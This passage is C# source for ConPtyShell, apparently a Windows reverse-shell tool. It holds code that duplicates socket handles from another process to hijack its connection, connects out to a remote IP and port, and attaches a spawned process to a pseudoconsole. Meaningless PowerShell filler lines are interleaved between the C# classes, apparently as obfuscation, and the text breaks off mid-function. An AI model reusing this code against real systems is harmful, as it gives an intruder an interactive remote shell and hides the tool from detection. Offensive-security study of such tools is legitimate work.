                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
                sockBytesIn.handle = sock;
                sockBytesIn.BytesIn = sockInfo.BytesIn;
                socketsBytesIn.Add(sockBytesIn);
            }
            else
                closesocket(sock);
        }
        if (socketsBytesIn.Count < 1) return socketsOut;
        if (socketsBytesIn.Count >= 2)
            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
        {
            socketsOut.Add(sockBytesIn.handle);
            // Console.WriteLine("dEBuG: sOCKet HANDlE 0x" + sockBytesIn.handle.ToString("X4") + " toTAl bYTeS rEceiVed: " + sockBytesIn.BytesIn.ToString());
        }
        return socketsOut;
    }

    private static bool GetSocketTcpInfo(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)
    {
        int result = -1;
        UInt32 tcpInfoVersion = 0;
        int bytesReturned = 0;
        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));
        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);
        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
        if (result != 0)
        {
            // Console.WriteLine("debUG: wsAIOctl1 FAIlEd WITH return CoDE " + result.ToString() + " and wSaLASTERrOr: " + WSAGetLastError().ToString());
            tcpInfoOut = new TCP_INFO_v0();
            return false;
        }
        TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
        tcpInfoOut = tcpInfoV0;
        Marshal.FreeHGlobal(tcpInfoPtr);
        return true;
    }

    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
    {
        IntPtr retSocket = IntPtr.Zero;
        IntPtr duplicatedSocket = IntPtr.Zero;
        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
        if (status == 0)
        {
            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
            if (duplicatedSocket.ToInt64() > 0)
            {
                retSocket = duplicatedSocket;
            }
        }
        return retSocket;
    }

    //helper method with "dynamic" buffer allocation
    public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
    {
        if (infoLength == 0)
            infoLength = Marshal.SizeOf(typeof(int));
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        uint result;
        while (true)
        {
            result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);
            if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)
            {
                Marshal.FreeHGlobal(infoPtr);
                infoPtr = Marshal.AllocHGlobal((int)infoLength);
                continue;
            }
            else if (result == NTSTATUS_SUCCESS)
                break;
            else
            {
                //throw new Exception("Unhandled NtStatus " + result);
                break;
            }
        }
        if (result == NTSTATUS_SUCCESS)
            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
        else
            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
        return IntPtr.Zero;
    }

    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
    {
        OBJECT_NAME_INFORMATION objNameInfo;
        long HandlesCount = 0;
        IntPtr dupHandle;
        IntPtr ptrObjectName;
        IntPtr ptrHandlesInfo;
        IntPtr hTargetProcess;
        string strObjectName;
        List<IntPtr> socketsHandles = new List<IntPtr>();
        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
        if (hTargetProcess == IntPtr.Zero)
        {
            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
            return socketsHandles;
        }
        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
        // get TypeIndex for "File" objects, needed to filter only sockets objects
        byte TypeIndexFileObject = GetTypeIndexByName("File");
        for (int i = 0; i < HandlesCount; i++)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
            try
            {
                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            }
            catch
            {
                break;
            }
            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                continue;
            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
            {
                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                { // this will avoids deadlocks on special named pipe handles
                    // Console.WriteLine("debug: Deadlock detected");
                    CloseHandle(dupHandle);
                    continue;
                }
                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
                if (ptrObjectName == IntPtr.Zero)
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                try
                {
                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
                }
                catch
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                {
                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
                    if (strObjectName == "\\Device\\Afd")
                        socketsHandles.Add(dupHandle);
                    else
                        CloseHandle(dupHandle);
                }
                else
                    CloseHandle(dupHandle);
                Marshal.FreeHGlobal(ptrObjectName);
                ptrObjectName = IntPtr.Zero;
            }
        }
        Marshal.FreeHGlobal(ptrHandlesInfo);
        List<IntPtr> dupedSocketsHandles = DuplicateSocketsFromHandles(socketsHandles);
        if (dupedSocketsHandles.Count >= 1)
            dupedSocketsHandles = FilterAndOrderSocketsByBytesIn(dupedSocketsHandles);
        socketsHandles = dupedSocketsHandles;
        return socketsHandles;
    }

    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
    {
        bool inherited = false;
        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
        if (parentSocketsHandles.Count < 1)
            return inherited;
        foreach (IntPtr parentSocketHandle in parentSocketsHandles)
        {
            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
            if (
                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == 0) &&
                (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&
                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
               )
            {
                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
                inherited = true;
            }
            closesocket(parentSocketHandle);
        }
        return inherited;
    }

    public static bool IsSocketOverlapped(IntPtr socket)
    {
        bool ret = false;
        IntPtr sockEvent = IntPtr.Zero;
        int ntStatus = -1;
        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
        if (ntStatus != NTSTATUS_SUCCESS)
        {
            // Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
            return ret;
        }
        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
        // Wait for Completion 
        if (ntStatus == NTSTATUS_PENDING)
        {
            WaitForSingleObject(sockEvent, INFINITE);
            ntStatus = IOSB.status;
        }
        CloseHandle(sockEvent);

        if (ntStatus != NTSTATUS_SUCCESS)
        {
            // Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
            return ret;
        }
        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
        return ret;
    }

    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        IntPtr targetSocketHandle = IntPtr.Zero;
        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
        if (targetProcessSockets.Count < 1) return targetSocketHandle;
        else
        {
            foreach (IntPtr socketHandle in targetProcessSockets)
            {
                // we prioritize the hijacking of Overlapped sockets
                if (!IsSocketOverlapped(socketHandle))
                {
                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
                    continue;
                }
                targetSocketHandle = socketHandle;
                overlappedSocket = true;
                break;
            }
            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
            if (targetSocketHandle == IntPtr.Zero) {
                // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
                foreach (IntPtr socketHandle in targetProcessSockets)
                {
                    targetSocketHandle = socketHandle;
                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;
                    break;
                }
            }
        }
        if (targetSocketHandle == IntPtr.Zero)
            throw new ConPtyShellException("No sockets found, so no hijackable sockets :( Exiting...");
        return targetSocketHandle;
    }
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        int FIONBIO = -2147195266;
        int NonBlockingMode = 1;
        int BlockingMode = 0;
        int result;
        if (mode == 1)
            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);
        else
            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
        if (result == -1)
            throw new ConPtyShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}
if ($false) {
    $dataArray = @(1..10 | ForEach-Object { Get-Random -Minimum 100 -Maximum 999 }); $filteredArray = $dataArray | Where-Object { $_ -gt 500 }; Write-Debug "Filtered array count: $($filteredArray.Count)"
}
$M1pSX = 57; $M1pSX = $M1pSX + 2 - 8; $M1pSX = $null

$env:COMPUTERNAME.Length | Out-Null
// source from --> https://stackoverflow.com/a/3346055
[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    // These members must match PROCESS_BASIC_INFORMATION
    internal IntPtr Reserved1;
    internal IntPtr PebBaseAddress;
    internal IntPtr Reserved2_0;
    internal IntPtr Reserved2_1;
    internal IntPtr UniqueProcessId;
    internal IntPtr InheritedFromUniqueProcessId;

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);

    public static Process GetParentProcess()
    {
        return GetParentProcess(Process.GetCurrentProcess().Handle);
    }

    public static Process GetParentProcess(int id)
    {
        Process process = Process.GetProcessById(id);
        return GetParentProcess(process.Handle);
    }

    public static Process GetParentProcess(IntPtr handle)
    {
        ParentProcessUtilities pbi = new ParentProcessUtilities();
        int returnLength;
        int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
        if (status != 0)
            throw new ConPtyShellException(status.ToString());
        try
        {
            return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
        }
        catch (ArgumentException)
        {
            // not found
            return null;
        }
    }
}

while ($false) {
    $iniContent = "[Section1]
Key1=Val1
Key2=Val2"; $parsedIni = ConvertFrom-StringData -StringData $iniContent; Write-Debug "Parsed INI Key1: $($parsedIni.Key1)"
}
[int]'5' | Out-Null
public static class ConPtyShell
{
    private const string errorString = "{{{ConPtyShellException}}}\r\n";
    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const int STARTF_USESTDHANDLES = 0x00000100;
    private const int BUFFER_SIZE_PIPE = 1048576;
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const UInt32 INFINITE = 0xFFFFFFFF;
    private const int SW_HIDE = 0;
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_SHARE_WRITE = 0x00000002;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint OPEN_EXISTING = 3;
    private const int STD_INPUT_HANDLE = -10;
    private const int STD_OUTPUT_HANDLE = -11;
    private const int STD_ERROR_HANDLE = -12;
    private const int WSAEWOULDBLOCK = 10035;
    private const int FD_READ = (1 << 0);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr hPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool FreeConsole();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr WSACreateEvent();

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSAResetEvent(IntPtr hEvent);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSACloseEvent(IntPtr hEvent);

    [DllImport("ntdll.dll")]
    private static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll")]
    private static extern uint NtResumeProcess(IntPtr processHandle);

    private static void InitWSAThread()
    {
        WSAData data;
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }

    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        int port = 0;
        int error = 0;
        string host = remoteIp;

        try
        {
            port = Convert.ToInt32(remotePort);
        }
        catch
        {
            throw new ConPtyShellException("Specified port is invalid: " + remotePort.ToString());
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            error = WSAGetLastError();
            throw new ConPtyShellException(String.Format("WSAConnect failed with error code: {0}", error));
        }

        return socket;
    }

    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
    {
        Thread.Sleep(500);//little tweak for slower connections
        byte[] received = new byte[100];
        int rowsTemp, colsTemp;
        int bytesReceived = recv(shellSocket, received, 100, 0);
        try
        {
            string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
            string rowsString = sizeReceived.Split(' ')[0].Trim();
            string colsString = sizeReceived.Split(' ')[1].Trim();
            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
            {
                rows = (uint)rowsTemp;
                cols = (uint)colsTemp;
            }
        }
        catch
        {
            return;
        }
    }

    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        pSec.bInheritHandle = 1;
        pSec.lpSecurityDescriptor = IntPtr.Zero;
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new ConPtyShellException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new ConPtyShellException("Could not create the OutputPipe");
    }

    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
    {
        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
        SetStdHandle(STD_ERROR_HANDLE, hStdout);
        SetStdHandle(STD_INPUT_HANDLE, hStdin);
    }

    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
    {
        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
    }

    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint outConsoleMode = 0;
        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!GetConsoleMode(hStdOut, out outConsoleMode))
        {
            throw new ConPtyShellException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new ConPtyShellException("Could not enable virtual terminal processing");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        EnableVirtualTerminalSequenceProcessing();
        COORD consoleCoord = new COORD();
        consoleCoord.X = (short)cols;
        consoleCoord.Y = (short)rows;
        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }

    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        IntPtr lpSize = IntPtr.Zero;
        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        if (success || lpSize == IntPtr.Zero)
        {
            throw new ConPtyShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
        if (!success)
        {
            throw new ConPtyShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        if (!success)
        {
            throw new ConPtyShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }

    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        int securityAttributeSize = Marshal.SizeOf(pSec);
        pSec.nLength = securityAttributeSize;
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        tSec.nLength = securityAttributeSize;
        bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        if (!success)
        {
            throw new ConPtyShellException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }

    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
    {
        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
        return processInfo;
    }

    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        bool readSuccess = false;
